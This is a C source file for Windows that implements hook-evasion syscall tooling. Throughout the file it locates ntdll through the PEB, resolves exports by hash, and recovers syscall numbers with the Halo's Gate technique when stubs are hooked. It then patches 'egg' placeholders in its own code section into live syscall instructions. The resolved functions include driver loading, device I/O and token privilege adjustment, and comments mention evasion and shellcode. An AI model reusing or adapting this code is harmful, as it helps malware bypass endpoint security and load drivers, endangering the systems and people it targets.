#include "SCSyscalls.h"
#include <stddef.h>
#include <stdio.h>


#ifdef EGG_MODE

#define logerror(fmt, ...) \
	do { \
		fprintf(stderr, "[ERROR] " fmt "\n", ##__VA_ARGS__); \
	} while (0)


/* =========================================================================
 *  Constants
 * ========================================================================= */
#define SC_FUNC_COUNT    8U
#define SC_MAX_EXPORTS   1024U
#define SC_GADGET_POOL   0U
#define SC_GADGET_MASK   (-1U)  /* pool must be power of 2 */

#define SC_DECRYPT(v) (v)

 /* DJB2 hashes of function names (compile-time) */
static const DWORD SC_FuncHashes[SC_FUNC_COUNT] = {
	0x5EC458C4U,	/* NtLoadDriver */
	0x81A34EFFU,	/* NtUnloadDriver */
	0x903760DFU,	/* NtQuerySystemInformation */
	0xDD22B9C3U,	/* NtDeviceIoControlFile */
	0x5E86F6A5U,	/* NtOpenProcessTokenEx */
	0xF0A9EE96U,	/* NtAdjustPrivilegesToken */
	0xB89A4FCAU,	/* NtClose */
	0xADE1FCFEU		/* NtCreateFile*/
};


/* =========================================================================
 *  Runtime tables (populated by SC_Initialize)
 * ========================================================================= */
DWORD  SC_SsnTable[SC_FUNC_COUNT];          /* SSN for each function */

/* =========================================================================
 *  DJB2 hash (matches compile-time hashes above)
 * ========================================================================= */
static DWORD SC_HashStr(const char* s)
{
	DWORD h = 0x1686U;
	//DWORD h = 0x1505U;
	while (*s)
	{
		h = ((h << 5) + h) ^ (unsigned char)*s++;
	}
	return h;
}

/* =========================================================================
 *  Locate ntdll.dll via PEB (no Win32 API calls)
 * ========================================================================= */
static PVOID SC_GetNtdllBase(VOID)
{
	PPEB pPeb = (PPEB)__readgsqword(0x60);
	PPEB_LDR_DATA   pLdr = pPeb->Ldr;
	PLIST_ENTRY     pHead = &pLdr->InMemoryOrderModuleList;
	PLIST_ENTRY     pEntry = pHead->Flink;	/* exe */
	pEntry = pEntry->Flink;					/* ntdll (always 2nd in InMemoryOrder) */
	PLDR_DATA_TABLE_ENTRY pMod = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
	return pMod->DllBase;
}

/* Get own image base via PEB */
static PVOID SC_GetOwnImageBase(VOID)
{
	PPEB pPeb = (PPEB)__readgsqword(0x60);
	PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
	PLDR_DATA_TABLE_ENTRY pMod = CONTAINING_RECORD(pHead->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
	return pMod->DllBase;
}

/* =========================================================================
 *  EAT utility: find export by hash
 * ========================================================================= */
static PVOID SC_GetProcByHash(PVOID pModule, DWORD dwHash)
{
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pModule + pDos->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(
		(PBYTE)pModule +
		pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD pFnArr = (PDWORD)((PBYTE)pModule + pExp->AddressOfFunctions);
	PDWORD pNmArr = (PDWORD)((PBYTE)pModule + pExp->AddressOfNames);
	PWORD  pOrArr = (PWORD)((PBYTE)pModule + pExp->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pExp->NumberOfNames; i++)
	{
		const char* pName = (const char*)((PBYTE)pModule + pNmArr[i]);
		if (SC_HashStr(pName) == dwHash)
		{
			return (PVOID)((PBYTE)pModule + pFnArr[pOrArr[i]]);
		}
	}
	return NULL;
}

/* Find export by name string (for VEH-based methods) */
static PVOID SC_GetProcByName(PVOID pModule, const char* szName)
{
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pModule + pDos->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(
		(PBYTE)pModule +
		pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD pFnArr = (PDWORD)((PBYTE)pModule + pExp->AddressOfFunctions);
	PDWORD pNmArr = (PDWORD)((PBYTE)pModule + pExp->AddressOfNames);
	PWORD  pOrArr = (PWORD)((PBYTE)pModule + pExp->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pExp->NumberOfNames; i++)
	{
		const char* pName = (const char*)((PBYTE)pModule + pNmArr[i]);
		DWORD j = 0;
		while (pName[j] && szName[j] && pName[j] == szName[j]) j++;
		if (pName[j] == 0 && szName[j] == 0)
		{
			return (PVOID)((PBYTE)pModule + pFnArr[pOrArr[i]]);
		}
	}
	return NULL;
}

/* =========================================================================
 *  Insertion-sort helper for export arrays (avoids qsort dependency)
 * ========================================================================= */
static VOID SC_SortExports(PSC_EXPORT arr, DWORD n)
{
	for (DWORD i = 1; i < n; i++)
	{
		SC_EXPORT key = arr[i];
		LONG j = (LONG)i - 1;
		while (j >= 0 && arr[j].Address > key.Address)
		{
			arr[j + 1] = arr[j];
			j--;
		}
		arr[j + 1] = key;
	}
}

/* =========================================================================
 *  Parse PE section headers (used by multiple evasion techniques)
 * ========================================================================= */
static PIMAGE_SECTION_HEADER SC_FindSection(PVOID pModule, const char* name)
{
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pModule + pDos->e_lfanew);
	PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

	for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++)
	{
		BOOL match = TRUE;
		for (int j = 0; name[j]; j++)
		{
			if (pSec->Name[j] != (BYTE)name[j])
			{
				match = FALSE; break;
			}
		}
		if (match)
		{
			return pSec;
		}
	}
	return NULL;
}

/* =========================================================================
 *  Halo's Gate SSN resolution
 *  Extends Hell's Gate: when a stub is hooked (E9 JMP), searches neighboring
 *  stubs in the sorted export list and infers SSN by +/- offset.
 * ========================================================================= */
static BOOL SC_HalosGate(PVOID pNtdll)
{
	/* Build sorted export list first */
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pNtdll;
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pNtdll + pDos->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(
		(PBYTE)pNtdll +
		pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PDWORD pFnArr = (PDWORD)((PBYTE)pNtdll + pExp->AddressOfFunctions);
	PDWORD pNmArr = (PDWORD)((PBYTE)pNtdll + pExp->AddressOfNames);
	PWORD  pOrArr = (PWORD)((PBYTE)pNtdll + pExp->AddressOfNameOrdinals);

	SC_EXPORT exports[SC_MAX_EXPORTS];
	DWORD count = 0;
	for (DWORD i = 0; i < pExp->NumberOfNames && count < SC_MAX_EXPORTS; i++)
	{
		const char* n = (const char*)((PBYTE)pNtdll + pNmArr[i]);
		if (n[0] == 'N' && n[1] == 't')
		{
			exports[count].Address = (PVOID)((PBYTE)pNtdll + pFnArr[pOrArr[i]]);
			exports[count].Hash = SC_HashStr(n);
			exports[count].Ordinal = i;
			count++;
		}
	}
	SC_SortExports(exports, count);

	for (DWORD fi = 0; fi < SC_FUNC_COUNT; fi++)
	{
		/* Find this function in sorted list */
		LONG myIdx = -1;
		for (DWORD ei = 0; ei < count; ei++)
		{
			if (exports[ei].Hash == SC_FuncHashes[fi])
			{
				myIdx = (LONG)ei;
				break;
			}
		}
		if (myIdx < 0)
		{
			continue;
		}

		PBYTE pFn = (PBYTE)exports[myIdx].Address;
		BOOL resolved = FALSE;

		/* Check if clean (unhooked) */
		for (DWORD k = 0; k < 32 && !resolved; k++)
		{
			if (pFn[k] == 0x4Cu && pFn[k + 1u] == 0x8Bu &&
				pFn[k + 2u] == 0xD1u && pFn[k + 3u] == 0xB8u)
			{
				DWORD ssn = (DWORD)pFn[k + 4u] | ((DWORD)pFn[k + 5u] << 8u);
				SC_SsnTable[fi] = ssn;

				resolved = TRUE;
			}
		}

		/* Hooked: scan neighbors (up to 8 stubs away) */
		if (!resolved)
		{
			for (LONG delta = 1; delta <= 8 && !resolved; delta++)
			{
				for (LONG dir = -1; dir <= 1 && !resolved; dir += 2)
				{
					LONG ni = myIdx + delta * dir;
					if (ni < 0 || ni >= (LONG)count)
					{
						continue;
					}
					PBYTE pN = (PBYTE)exports[ni].Address;
					for (DWORD k = 0; k < 32 && !resolved; k++)
					{
						if (pN[k] == 0x4Cu && pN[k + 1u] == 0x8Bu &&
							pN[k + 2u] == 0xD1u && pN[k + 3u] == 0xB8u)
						{
							DWORD neighborSsn = (DWORD)pN[k + 4u] | ((DWORD)pN[k + 5u] << 8u);
							/* Our SSN = neighbor SSN - (sorted_index_delta) */
							DWORD ssn = neighborSsn - (DWORD)(delta * dir);
							SC_SsnTable[fi] = ssn;

							resolved = TRUE;
						}
					}
				}
			}
		}
	}
	return TRUE;
}

/* =========================================================================
 *  Egg hatcher (egg method)
 *  Scans the PE's .text section for the 8-byte egg pattern and replaces
 *  it with the syscall opcode (0F 05) + NOPs, making the stub callable.
 * ========================================================================= */
#define SC_EGG_SIZE  8U
static const BYTE SC_EggPattern[SC_EGG_SIZE] = { 0x59u, 0x97u, 0x8Du, 0xB4u, 0x52u, 0x40u, 0x38u, 0xDFu };

BOOL SC_HatchEggs(VOID)
{
	PVOID pImageBase = SC_GetOwnImageBase();

	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pImageBase;
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pImageBase + pDos->e_lfanew);
	PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

	for (WORD si = 0; si < pNt->FileHeader.NumberOfSections; si++, pSec++)
	{
		if (!(pSec->Characteristics & IMAGE_SCN_MEM_EXECUTE))
		{
			continue;
		}

		PBYTE  pBase = (PBYTE)pImageBase + pSec->VirtualAddress;
		DWORD  size = pSec->Misc.VirtualSize;
		DWORD  oldProt = 0;

		/* Make section writable */
		if (!VirtualProtect(pBase, size, PAGE_EXECUTE_READWRITE, &oldProt))
		{
			logerror("VirtualProtect failed with error code: %u", GetLastError());
			return FALSE;
		}

		/* Scan and replace eggs */
		for (DWORD i = 0; i + SC_EGG_SIZE <= size; i++)
		{
			if (memcmp(pBase + i, SC_EggPattern, SC_EGG_SIZE) == 0)
			{
				pBase[i + 0] = 0x0Fu;  /* syscall opcode */
				pBase[i + 1] = 0x05u;
				/* Fill remaining 6 bytes with NOPs */
				for (DWORD j = 2; j < SC_EGG_SIZE; j++)
				{
					pBase[i + j] = 0x90u;
				}
			}
		}

		/* Restore protection */
		VirtualProtect(pBase, size, oldProt, &oldProt);
	}
	return TRUE;
}

/* =========================================================================
 *  SC_Initialize -- call once at process/shellcode startup
 * ========================================================================= */
BOOL SC_Initialize(VOID)
{
	PVOID pNtdll = SC_GetNtdllBase();
	if (!pNtdll)
	{
		logerror("Failed to locate ntdll.dll");
		return FALSE;
	}

	return SC_HalosGate(pNtdll);
}


BOOLEAN RunSyscallInit()
{
	BOOLEAN bRet = FALSE;
	bRet = SC_Initialize();
	if (!bRet)
	{
		logerror("SC_Initialize failed");
		return bRet;
	}

	bRet = SC_HatchEggs();
	if (!bRet)
	{
		logerror("SC_HatchEggs failed");
		return bRet;
	}

	return bRet;
}


#endif